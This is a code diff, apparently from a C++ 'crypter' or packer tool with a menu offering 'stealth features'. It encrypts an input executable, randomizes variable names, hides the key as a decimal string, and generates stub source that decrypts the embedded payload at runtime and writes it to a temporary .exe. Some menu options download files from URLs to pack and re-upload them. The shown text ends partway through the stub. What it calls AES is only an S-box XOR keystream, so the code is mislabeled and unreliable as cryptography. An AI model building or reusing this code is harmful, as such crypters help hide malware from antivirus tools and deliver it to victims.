@@ -1,56 +1,242 @@
-    // ChaCha20 implementation
-    void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
-        a += b; d ^= a; d = (d << 16) | (d >> 16);
-        c += d; b ^= c; b = (b << 12) | (b >> 20);
-        a += b; d ^= a; d = (d << 8) | (d >> 24);
-        c += d; b ^= c; b = (b << 7) | (b >> 25);
-    }
-
-    void chachaBlock(uint32_t out[16], const uint32_t in[16]) {
-        for (int i = 0; i < 16; i++) out[i] = in[i];
-        
-        for (int i = 0; i < 10; i++) {
-            quarterRound(out[0], out[4], out[8], out[12]);
-            quarterRound(out[1], out[5], out[9], out[13]);
-            quarterRound(out[2], out[6], out[10], out[14]);
-            quarterRound(out[3], out[7], out[11], out[15]);
-            
-            quarterRound(out[0], out[5], out[10], out[15]);
-            quarterRound(out[1], out[6], out[11], out[12]);
-            quarterRound(out[2], out[7], out[8], out[13]);
-            quarterRound(out[3], out[4], out[9], out[14]);
-        }
-        
-        for (int i = 0; i < 16; i++) out[i] += in[i];
-    }
-
-    void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12]) {
-        const char* constants = "expand 32-byte k";
-        memcpy(state, constants, 16);
-        memcpy(state + 4, key, 32);
-        state[12] = 0;
-        memcpy(state + 13, nonce, 12);
-    }
-
-    void chacha20Crypt(std::vector<uint8_t>& data, const uint8_t key[32], const uint8_t nonce[12]) {
-        uint32_t state[16];
-        initChachaState(state, key, nonce);
-        
-        for (size_t i = 0; i < data.size(); i += 64) {
-            uint32_t keystream[16];
-            chachaBlock(keystream, state);
-            
-            uint8_t* ks_bytes = (uint8_t*)keystream;
-            for (size_t j = 0; j < 64 && i + j < data.size(); j++) {
-                data[i + j] ^= ks_bytes[j];
+            while (carry > 0) {
+                result.insert(result.begin(), carry % 10);
+                carry /= 10;
             }
             
-            state[12]++;
+            carry = byte;
+            for (int i = result.size() - 1; i >= 0 && carry > 0; i--) {
+                int sum = result[i] + carry;
+                result[i] = sum % 10;
+                carry = sum / 10;
+            }
+            while (carry > 0) {
+                result.insert(result.begin(), carry % 10);
+                carry /= 10;
+            }
+        }
+        
+        std::string decimal;
+        for (uint8_t digit : result) {
+            decimal += ('0' + digit);
+        }
+        return decimal.empty() ? "0" : decimal;
+    }
+
+    std::string generateUniqueVarName() {
+        const std::vector<std::string> prefixes = {"var", "data", "buf", "mem", "tmp", "obj", "ptr", "val", "cfg", "sys"};
+        const std::vector<std::string> middles = {"Core", "Mgr", "Proc", "Ctrl", "Hdl", "Ref", "Ctx", "Buf", "Ops", "Util"};
+        const std::vector<std::string> suffixes = {"Ex", "Ptr", "Obj", "Cfg", "Mgr", "Ctx", "Buf", "Ops", "Val", "Ref"};
+        
+        std::string name = prefixes[rng() % prefixes.size()];
+        name += middles[rng() % middles.size()];
+        name += suffixes[rng() % suffixes.size()];
+        name += std::to_string(rng() % 10000);
+        
+        return name;
+    }
+
+public:
+    VS2022MenuEncryptor() : rng(std::chrono::high_resolution_clock::now().time_since_epoch().count()) {}
+
+    void showMenu() {
+        std::cout << "\n=== Visual Studio 2022 Universal Encryptor ===" << std::endl;
+        std::cout << "Advanced encryption tool with multiple algorithms and stealth features\n" << std::endl;
+        
+        std::cout << "Select an option:" << std::endl;
+        std::cout << "  1. Pack File (AES Encryption) - Works like UPX" << std::endl;
+        std::cout << "  2. Pack File (ChaCha20 Encryption) - Works like UPX" << std::endl;
+        std::cout << "  3. Pack File (Triple Encryption) - Maximum Security" << std::endl;
+        std::cout << "  4. Basic File Encryption (Save to disk)" << std::endl;
+        std::cout << "  5. Advanced: Generate Custom MASM Stub" << std::endl;
+        std::cout << "  6. URL Crypto Service (AES) - Download, Encrypt & Re-upload" << std::endl;
+        std::cout << "  7. URL Crypto Service (Triple) - Download, Encrypt & Re-upload" << std::endl;
+        std::cout << "  8. URL Crypto Service (ChaCha20) - Download, Encrypt & Re-upload" << std::endl;
+        std::cout << "  9. URL Crypto Service (Basic) - Download, Encrypt & Save" << std::endl;
+        std::cout << " 10. URL Pack File (AES) - Download & Pack from URL" << std::endl;
+        std::cout << " 11. URL Pack File (ChaCha20) - Download & Pack from URL" << std::endl;
+        std::cout << " 12. URL Pack File (Triple) - Download & Pack from URL" << std::endl;
+        std::cout << " 13. Local Crypto Service (AES) - Pack Local File" << std::endl;
+        std::cout << " 14. Local Crypto Service (ChaCha20) - Pack Local File" << std::endl;
+        std::cout << " 15. Local Crypto Service (Triple) - Pack Local File" << std::endl;
+        std::cout << "  0. Exit" << std::endl;
+        std::cout << "\nEnter your choice: ";
+    }
+    void run() {
+        int choice;
+        std::cin >> choice;
+        std::cin.ignore(); // Clear the newline character
+
+        switch (choice) {
+            case 1:
+                generateAESPacker();
+                break;
+            case 2:
+                generateChaCha20Packer();
+                break;
+            case 3:
+                generateTriplePacker();
+                break;
+            case 4:
+                basicFileEncryption();
+                break;
+            case 5:
+                generateMASMStub();
+                break;
+            case 6:
+                urlCryptoServiceAES();
+                break;
+            case 7:
+                urlCryptoServiceTriple();
+                break;
+            case 8:
+                urlCryptoServiceChaCha20();
+                break;
+            case 9:
+                urlCryptoServiceBasic();
+                break;
+            case 10:
+                urlPackFileAES();
+                break;
+            case 11:
+                urlPackFileChaCha20();
+                break;
+            case 12:
+                urlPackFileTriple();
+                break;
+            case 13:
+                localCryptoServiceAES();
+                break;
+            case 14:
+                localCryptoServiceChaCha20();
+                break;
+            case 15:
+                localCryptoServiceTriple();
+                break;
+            case 0:
+                std::cout << "Goodbye!" << std::endl;
+                break;
+            default:
+                std::cout << "Invalid choice. Please try again." << std::endl;
         }
     }
 
-    // AES S-box
-    static const uint8_t sbox[256] = {
+    // Basic file encryption (option 4)
+    void basicFileEncryption() {
+        std::string inputFile;
+        std::cout << "Enter input file path: ";
+        std::getline(std::cin, inputFile);
+
+        std::ifstream file(inputFile, std::ios::binary);
+        if (!file) {
+            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
+            return;
+        }
+
+        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        file.close();
+
+        // Generate keys
+        auto keys = generateKeys();
+        
+        // Apply triple encryption with randomized order
+        std::vector<uint8_t> data = fileData;
+        
+        switch (keys.encryption_order) {
+            case 0: // ChaCha20 -> AES -> XOR
+                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
+                aesStreamCrypt(data, keys.aes_key);
+                xorCrypt(data, keys.xor_key);
+                break;
+            case 1: // ChaCha20 -> XOR -> AES
+                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
+                xorCrypt(data, keys.xor_key);
+                aesStreamCrypt(data, keys.aes_key);
+                break;
+            case 2: // AES -> ChaCha20 -> XOR
+                aesStreamCrypt(data, keys.aes_key);
+                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
+                xorCrypt(data, keys.xor_key);
+                break;
+            case 3: // AES -> XOR -> ChaCha20
+                aesStreamCrypt(data, keys.aes_key);
+                xorCrypt(data, keys.xor_key);
+                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
+                break;
+            case 4: // XOR -> ChaCha20 -> AES
+                xorCrypt(data, keys.xor_key);
+                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
+                aesStreamCrypt(data, keys.aes_key);
+                break;
+            case 5: // XOR -> AES -> ChaCha20
+                xorCrypt(data, keys.xor_key);
+                aesStreamCrypt(data, keys.aes_key);
+                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
+                break;
+        }
+
+        // Save encrypted file
+        std::string outputFile = inputFile + ".encrypted";
+        std::ofstream outFile(outputFile, std::ios::binary);
+        if (!outFile) {
+            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
+            return;
+        }
+
+        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
+        outFile.close();
+
+        std::cout << "✅ File encrypted successfully!" << std::endl;
+        std::cout << "📁 Output: " << outputFile << std::endl;
+        std::cout << "🔐 Encryption order: " << keys.encryption_order << std::endl;
+        std::cout << "📏 Original size: " << fileData.size() << " bytes" << std::endl;
+        std::cout << "📏 Encrypted size: " << data.size() << " bytes" << std::endl;
+    }
+
+    // AES Packer (option 1) - Works like UPX
+    void generateAESPacker() {
+        std::string inputFile;
+        std::cout << "Enter input file path: ";
+        std::getline(std::cin, inputFile);
+
+        std::ifstream file(inputFile, std::ios::binary);
+        if (!file) {
+            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
+            return;
+        }
+
+        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        file.close();
+
+        // Generate AES key
+        auto keys = generateKeys();
+        std::vector<uint8_t> encryptedData = fileData;
+        aesStreamCrypt(encryptedData, keys.aes_key);
+
+        // Convert key to decimal for obfuscation
+        std::string keyDecimal = bytesToBigDecimal(keys.aes_key);
+
+        // Generate unique variable names
+        std::string payloadVar = generateUniqueVarName();
+        std::string keyVar = generateUniqueVarName();
+        std::string sizeVar = generateUniqueVarName();
+        std::string bufferVar = generateUniqueVarName();
+        std::string funcName = generateUniqueVarName();
+
+        // Create the packed executable source
+        std::string sourceCode = R"(#include <iostream>
+#include <vector>
+#include <fstream>
+#include <cstring>
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/stat.h>
+#include <cstdlib>
+#endif
+
+void )" + funcName + R"()(std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
+    static const unsigned char sbox[256] = {
         0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
         0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
         0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
@@ -68,50 +254,69 @@
         0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
         0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
     };
-
-    void aesStreamCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
-        std::vector<uint8_t> keystream;
-        keystream.reserve(data.size());
-        
-        // Generate keystream using AES S-box
-        for (size_t i = 0; i < data.size(); i++) {
-            uint8_t keyByte = key[i % key.size()];
-            uint8_t index = (keyByte + i) % 256;
-            keystream.push_back(sbox[index]);
-        }
-        
-        // XOR with data
-        for (size_t i = 0; i < data.size(); i++) {
-            data[i] ^= keystream[i];
-        }
+    
+    for (size_t i = 0; i < data.size(); i++) {
+        unsigned char keyByte = key[i % key.size()];
+        unsigned char nonceByte = (i >> 8) ^ (i & 0xFF);
+        unsigned char mixedKey = sbox[keyByte] ^ nonceByte;
+        data[i] ^= mixedKey;
     }
+}
 
-    // Enhanced XOR
-    void xorCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
-        for (size_t i = 0; i < data.size(); i++) {
-            data[i] ^= key[i % key.size()];
+std::vector<unsigned char> )" + keyVar + R"(FromDecimal(const std::string& decimal) {
+    std::vector<unsigned char> result;
+    std::vector<int> bigNum;
+    
+    for (char c : decimal) bigNum.push_back(c - '0');
+    
+    while (!bigNum.empty() && !(bigNum.size() == 1 && bigNum[0] == 0)) {
+        int remainder = 0;
+        for (size_t i = 0; i < bigNum.size(); i++) {
+            int current = remainder * 10 + bigNum[i];
+            bigNum[i] = current / 256;
+            remainder = current % 256;
         }
+        result.insert(result.begin(), remainder);
+        while (!bigNum.empty() && bigNum[0] == 0) bigNum.erase(bigNum.begin());
     }
+    
+    return result;
+}
 
-    TripleKey generateKeys() {
-        TripleKey keys;
-        
-        // Generate ChaCha20 key and nonce
-        keys.chacha_key.resize(32);
-        keys.chacha_nonce.resize(12);
-        for (int i = 0; i < 32; i++) keys.chacha_key[i] = rng() % 256;
-        for (int i = 0; i < 12; i++) keys.chacha_nonce[i] = rng() % 256;
-        
-        // Generate AES key
-        keys.aes_key.resize(32);
-        for (int i = 0; i < 32; i++) keys.aes_key[i] = rng() % 256;
-        
-        // Generate XOR key
-        keys.xor_key.resize(16);
-        for (int i = 0; i < 16; i++) keys.xor_key[i] = rng() % 256;
-        
-        // Randomize encryption order
-        keys.encryption_order = rng() % 6;
-        
-        return keys;
-    }
+int main() {
+    const std::string )" + keyVar + R"( = ")" + keyDecimal + R"(";
+    const unsigned int )" + sizeVar + R"( = )" + std::to_string(encryptedData.size()) + R"(;
+    
+    unsigned char )" + payloadVar + R"([)" + std::to_string(encryptedData.size()) + R"(] = {)";
+
+        // Embed the encrypted payload
+        for (size_t i = 0; i < encryptedData.size(); i++) {
+            if (i % 16 == 0) sourceCode += "\n        ";
+            sourceCode += "0x" + 
+                std::string(1, "0123456789ABCDEF"[(encryptedData[i] >> 4) & 0xF]) + 
+                std::string(1, "0123456789ABCDEF"[encryptedData[i] & 0xF]);
+            if (i < encryptedData.size() - 1) sourceCode += ",";
+        }
+
+        sourceCode += R"(
+    };
+    
+    std::vector<unsigned char> )" + bufferVar + R"(()" + payloadVar + R"(, )" + payloadVar + R"( + )" + sizeVar + R"();
+    std::vector<unsigned char> keyBytes = )" + keyVar + R"(FromDecimal()" + keyVar + R"();
+    
+    )" + funcName + R"()()" + bufferVar + R"(, keyBytes);
+    
+#ifdef _WIN32
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string tempFile = std::string(tempPath) + "\\upx_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
+#else
+    std::string tempFile = "/tmp/upx_temp_" + std::to_string(getpid());
+#endif
+    
+    std::ofstream outFile(tempFile, std::ios::binary);
+    if (!outFile) return 1;
+    
+    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
+    outFile.close();
+    
